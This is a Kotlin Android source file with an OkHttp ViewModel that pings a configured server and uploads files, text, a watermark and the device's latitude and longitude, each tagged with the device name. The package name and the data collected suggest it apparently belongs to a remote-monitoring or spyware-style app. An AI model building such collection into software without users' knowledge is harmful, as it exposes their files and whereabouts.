package willi.fiend.Utils

import android.content.Context
import android.util.Log
import androidx.lifecycle.ViewModel
import androidx.lifecycle.viewModelScope
import com.google.gson.Gson
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import java.io.File
import java.io.IOException

class AppRequest() : ViewModel() {
    private val CLIENT = OkHttpClient()
    private val HOST: String by lazy { AppTools.getAppData().host }

    fun awake() {
        viewModelScope.launch(Dispatchers.IO) {
            try {
                val request = Request.Builder().url(HOST).build()
                CLIENT.newCall(request).enqueue(object : Callback {
                    override fun onFailure(call: Call, e: IOException) {
                        Log.e("AppRequest", "awake failed: ${e.message}")
                    }
                    override fun onResponse(call: Call, response: Response) {
                        response.close()
                    }
                })
            } catch (e: Exception) {
                Log.e("AppRequest", "awake error: ${e.message}")
            }
        }
    }

    fun sendFile(file: File) {
        viewModelScope.launch(Dispatchers.IO) {
            try {
                val formBody = MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataPart("file", file.name, RequestBody.create(null, file))
                    .build()
                val request = Request.Builder()
                    .url(HOST + "uploadFile/")
                    .post(formBody)
                    .addHeader("model", AppTools.getDeviceName())
                    .build()
                CLIENT.newCall(request).enqueue(object : Callback {
                    override fun onFailure(call: Call, e: IOException) {
                        Log.e("AppRequest", "sendFile failed: ${e.message}")
                    }
                    override fun onResponse(call: Call, response: Response) {
                        response.close()
                    }
                })
            } catch (e: Exception) {
                Log.e("AppRequest", "sendFile error: ${e.message}")
            }
        }
    }

    fun sendText(text: Text) {
        viewModelScope.launch(Dispatchers.IO) {
            try {
                val gson = Gson().toJson(text)
                val request = Request.Builder()
                    .url(HOST + "uploadText/")
                    .post(RequestBody.create("application/json; charset=utf-8".toMediaType(), gson))
                    .addHeader("model", AppTools.getDeviceName())
                    .build()
                CLIENT.newCall(request).enqueue(object : Callback {
                    override fun onFailure(call: Call, e: IOException) {
                        Log.e("AppRequest", "sendText failed: ${e.message}")
                    }
                    override fun onResponse(call: Call, response: Response) {
                        response.close()
                    }
                })
            } catch (e: Exception) {
                Log.e("AppRequest", "sendText error: ${e.message}")
            }
        }
    }

    fun sendLocation(location: Location) {
        viewModelScope.launch(Dispatchers.IO) {
            try {
                val gson = Gson().toJson(location).toString()
                val request = Request.Builder()
                    .url(HOST + "uploadLocation/")
                    .post(RequestBody.create("application/json; charset=utf-8".toMediaType(), gson))
                    .addHeader("model", AppTools.getDeviceName())
                    .build()
                CLIENT.newCall(request).enqueue(object : Callback {
                    override fun onFailure(call: Call, e: IOException) {
                        Log.e("AppRequest", "sendLocation failed: ${e.message}")
                    }
                    override fun onResponse(call: Call, response: Response) {
                        response.close()
                    }
                })
            } catch (e: Exception) {
                Log.e("AppRequest", "sendLocation error: ${e.message}")
            }
        }
    }

    fun sendWaterMark() {
        viewModelScope.launch(Dispatchers.IO) {
            try {
                Log.i("WAT", AppTools.getWatermark())
                val gson = Gson().toJson(Text(AppTools.getWatermark()))
                val request = Request.Builder()
                    .url(HOST + "uploadText/")
                    .post(RequestBody.create("application/json; charset=utf-8".toMediaType(), gson))
                    .addHeader("model", AppTools.getDeviceName())
                    .build()
                CLIENT.newCall(request).enqueue(object : Callback {
                    override fun onFailure(call: Call, e: IOException) {
                        Log.e("AppRequest", "sendWaterMark failed: ${e.message}")
                    }
                    override fun onResponse(call: Call, response: Response) {
                        response.close()
                    }
                })
            } catch (e: Exception) {
                Log.e("AppRequest", "sendWaterMark error: ${e.message}")
            }
        }
    }

    data class Location(
        val lat: Float,
        val lon: Float
    )

    data class Text(
        val text: String
    )
}
